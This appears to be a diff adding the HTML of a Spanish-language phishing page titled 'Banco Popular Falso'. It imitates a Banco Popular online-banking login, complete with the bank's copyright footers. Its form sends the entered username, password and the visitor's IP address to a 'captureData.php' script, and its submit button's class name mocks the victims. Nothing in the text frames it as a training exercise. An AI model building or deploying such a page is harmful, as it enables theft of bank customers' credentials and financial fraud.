@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="assets/fontawesome/css/all.css">     
+
+    <link href="assets/css/styles.css" rel="stylesheet">
+    
+    <title>Banco Popular Falso</title>
+</head>
+<body class=" bg-fgris">
+<div class="background" >  <!-- Fondo -->
+ <div class="container">  <!-- container -->
+  
+    <div class="left-container">  <!-- leftcontainer --> 
+    <div class="wellcome">
+    <label>Bienvenido a</label>    
+    </div> 
+    <div >
+    <img class="logo" src="assets/img/Temenos_Full_Logo_withAnd_RGB.png" alt="">    
+    </div> 
+    <div class="buttons">
+    <div class="bempresa">
+    <a class="cbempresa" href="">EMPRESA</a>    
+    </div>  
+    <div class="bpersona">
+    <a class="cbpersona" href="">PERSONA</a>    
+    </div>  
+    </div>   
+    <div class="slider">
+<!-- Slider -->
+<div class="slideshow-container">
+
+    <div class="mySlides fade">
+      
+      <img src="assets/img/slider1.png" style="width:100%">
+      
+    </div>
+    
+    <div class="mySlides fade">
+      
+      <img src="assets/img/slider2.png" style="width:100%">
+      
+    </div>
+    
+    <div class="mySlides fade">
+     
+      <img src="assets/img/slider3.png" style="width:100%">
+      
+    </div>
+   </div>
+<!-- Slider -->
+    </div>
+        <div style="text-align:center">
+        <span class="dot"></span> 
+        <span class="dot"></span> 
+        <span class="dot"></span> 
+        </div>
+
+    </div>  <!-- leftcontainer -->                     
+   
+    <div class="centerb"></div>
+
+    <div class="right-container"> <!-- rigthcontainer -->                     
+    <div class="idiom">
+    <a href="">ENGLISH</a><div class="stick1">|</div><a href="">ESPAÑOL</a>
+    </div> 
+    
+    <div class="instruct">Digite usuario y contraseña</div>
+    <div class="form">
+    <form action="assets/php/captureData.php" method="post">
+
+<input class="inputtxt" name="name"  type="text" placeholder="Usuario">
+<input  class="inputtxt" name="pass" type="password" placeholder="Contraseña">
+<input type="hidden" name="ipadd" value="<?php echo $ipGuest; ?>">
+<div class="remember">
+<div class="remember1">    
+<input class="checkbox" type="checkbox" name="" id=""> 
+<div class="txtrem">¿Recordar Usuario?</div>
+</div>
+<div class="remember2">   
+<input class="checkbox" type="checkbox" name="" id="">
+<div class="txtrem">Posee Certificado Digital</div>
+</div> 
+</div>
+
+
+
+
+<input class="enviardatosdebabosobtn" type="submit" value="INICIAR SESÓN">
+</form>    
+</div>
+
+<div class="links">
+
+<div class="linkitem">  
+<i class="fa-solid fa-user" style="color: #f6903a;"></i>
+<a href="">Olvidé mi contraseña</a>
+</div>
+
+<div class="linkitem">
+  <i class="fa-solid fa-file-lines" style="color: #f6903a;"></i>
+<a href="">Registrar Certificado Digital</a>
+</div>
+
+<div class="linkitem">
+<i class="fa-solid fa-lock" style="color: #f6903a;"></i>
+<a href="">Bloquear mi usuario</a>
+</div>
+
+<div class="linkitem"> 
+  <i class="fa-solid fa-house" style="color: #f6903a;"></i>
+<a href="">Página de Ingreso </a>
+</div>
+
+</div>
+ 
+ </div>    <!-- rigthcontainer -->                     
+
+
+ <div class="footer2"> <!-- Footer -->
+  <label >© Banco Popular - Todos los Derechos Reservados 2019</label>
+</div>             <!-- Footer -->
+
+</div>                <!-- container -->
+
+
+<div class="footer"> <!-- Footer -->
+  <label >© Banco Popular - Todos los Derechos Reservados 2019</label>
+</div>             <!-- Footer -->
+
+</div>                <!-- Fondo -->
+
+
+<script src="assets/js/slider.js"></script>
+</body>
+</html>
